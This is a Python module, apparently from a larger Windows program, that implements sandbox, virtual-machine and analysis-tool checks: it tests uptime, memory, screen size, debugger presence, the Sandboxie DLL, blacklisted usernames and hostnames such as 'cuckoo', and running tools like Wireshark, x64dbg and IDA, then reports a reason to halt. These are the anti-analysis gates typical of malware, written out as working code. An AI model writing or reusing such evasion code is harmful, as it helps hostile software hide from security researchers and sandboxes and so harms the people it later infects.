"""Sandbox, VM and analysis-tool gates."""

import ctypes
import os
import socket

from .util import run_hidden

BLACKLIST_USERS = {"wdagutilityaccount", "sandbox", "malware", "virus", "tester", "test"}
BLACKLIST_HOSTS = {"sandbox", "malware", "analysis", "cuckoo", "vbox", "vmware", "virtual"}
ANALYSIS_TOOLS = (
    "vboxservice.exe",
    "vboxtray.exe",
    "vmtoolsd.exe",
    "vmwaretray.exe",
    "vmwareuser.exe",
    "wireshark.exe",
    "procmon.exe",
    "procmon64.exe",
    "x64dbg.exe",
    "x32dbg.exe",
    "ollydbg.exe",
    "ida64.exe",
    "ida.exe",
    "fiddler.exe",
    "httpdebuggerui.exe",
    "processhacker.exe",
    "dnspy.exe",
    "cheatengine-x86_64.exe",
    "pestudio.exe",
)


def uptime_minutes():
    return ctypes.windll.kernel32.GetTickCount64() / 60000.0


def ram_gb():
    from .sysinfo import total_ram_gb

    return total_ram_gb()


def debugger_attached():
    try:
        return bool(ctypes.windll.kernel32.IsDebuggerPresent())
    except Exception:
        return False


def analysis_tools_running():
    listing = run_hidden(["tasklist", "/fo", "csv", "/nh"], timeout=15).lower()
    return any(tool in listing for tool in ANALYSIS_TOOLS)


def reason():
    if uptime_minutes() < 10:
        return "uptime under 10 minutes"
    if ram_gb() < 1.5:
        return "low memory"
    if os.environ.get("USERNAME", "").lower() in BLACKLIST_USERS:
        return "blacklisted user"
    if socket.gethostname().lower() in BLACKLIST_HOSTS:
        return "blacklisted host"
    if debugger_attached():
        return "debugger attached"
    try:
        if ctypes.windll.kernel32.GetModuleHandleW("SbieDll.dll"):
            return "sandboxie"
    except Exception:
        pass
    if ctypes.windll.user32.GetSystemMetrics(1) < 700:
        return "small display"
    if analysis_tools_running():
        return "analysis tool running"
    return ""


def blocked():
    return bool(reason())
